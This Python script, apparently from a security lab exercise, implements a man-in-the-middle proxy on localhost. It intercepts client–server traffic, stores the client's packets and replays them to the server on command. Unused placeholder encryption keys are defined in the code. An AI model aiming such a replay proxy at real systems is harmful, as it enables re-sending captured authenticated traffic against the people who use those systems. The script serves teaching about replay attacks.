import socket
import threading
import logging
from config import PORT, ATTACKER_LISTEN_PORT

# Configuration
CLIENT_LISTEN = ('127.0.0.1', ATTACKER_LISTEN_PORT)  # Proxy listens here; client connects here
SERVER_TARGET = ('127.0.0.1', PORT)  # Proxy connects to real server here

# Add logging configuration
logging.basicConfig(level=logging.DEBUG, format='[%(asctime)s] [%(levelname)s] %(message)s')
logger = logging.getLogger("attacker")

# Encryption keys and parameters (placeholders, replace with actual values)
KEY = b'Sixteen byte key'
NONCE = b'UniqueNonce'
IV0 = b'InitializationVe'

class ReplayAttacker:
    def __init__(self):
        self.stored_packets = []  # Store intercepted packets for replay

    def intercept_and_forward(self, client_sock, server_sock):
        """Intercept packets from client and forward to server."""
        while True:
            try:
                packet = client_sock.recv(1024)
                if not packet:
                    logger.info("[CLIENT->SERVER] No more data from client. Closing forward thread.")
                    break

                # Log and store the packet for replay
                logger.debug(f"[CLIENT->SERVER] Intercepted packet: {packet!r} (len={len(packet)})")
                self.stored_packets.append(packet)

                # Forward the packet to the server
                server_sock.sendall(packet)
                logger.info(f"[CLIENT->SERVER] Forwarded packet of length {len(packet)} to server.")
            except Exception as e:
                logger.error(f"[ATTACKER] Error intercepting packet: {e}")
                break

    def intercept_and_forward_to_client(self, server_sock, client_sock):
        """Intercept packets from server and forward to client."""
        while True:
            try:
                packet = server_sock.recv(1024)
                if not packet:
                    logger.info("[SERVER->CLIENT] No more data from server. Closing backward thread.")
                    break

                # Log the intercepted response
                logger.debug(f"[SERVER->CLIENT] Intercepted packet: {packet!r} (len={len(packet)})")

                # Forward the packet to the client
                client_sock.sendall(packet)
                logger.info(f"[SERVER->CLIENT] Forwarded packet of length {len(packet)} to client.")
            except Exception as e:
                logger.error(f"[ATTACKER] Error intercepting from server: {e}")
                break

    def replay_packets(self, server_sock):
        """Replay stored packets to the server."""
        logger.info("[ATTACKER] Replaying stored packets...")
        for idx, packet in enumerate(self.stored_packets, start=1):
            try:
                server_sock.sendall(packet)
                logger.info(f"[ATTACKER] Replayed packet {idx}/{len(self.stored_packets)} (len={len(packet)})")
            except Exception as e:
                logger.error(f"[ATTACKER] Error replaying packet {idx}: {e}")

    def run(self):
        """Run the attacker as a man-in-the-middle proxy."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock, \
                 socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_sock:

                client_sock.bind(CLIENT_LISTEN)
                client_sock.listen(1)
                logger.info(f"[ATTACKER] Listening for client on {CLIENT_LISTEN}...")

                conn, addr = client_sock.accept()
                logger.info(f"[ATTACKER] Client connected from {addr}")

                server_sock.connect(SERVER_TARGET)
                logger.info(f"[ATTACKER] Connected to server at {SERVER_TARGET}")

                # Start intercepting and forwarding threads
                threading.Thread(target=self.intercept_and_forward, args=(conn, server_sock), daemon=True).start()
                threading.Thread(target=self.intercept_and_forward_to_client, args=(server_sock, conn), daemon=True).start()

                # Wait for user input to trigger replay
                while True:
                    cmd = input("Enter 'r' to replay packets or 'q' to quit: ").strip().lower()
                    if cmd == 'r':
                        self.replay_packets(server_sock)
                    elif cmd == 'q':
                        logger.info("[ATTACKER] Quit command received. Exiting.")
                        break
        except Exception as e:
            logger.error(f"[ATTACKER] Error in proxy: {e}")
        finally:
            logger.info("[ATTACKER] Shutting down attacker proxy")

if __name__ == "__main__":
    attacker = ReplayAttacker()
    attacker.run()
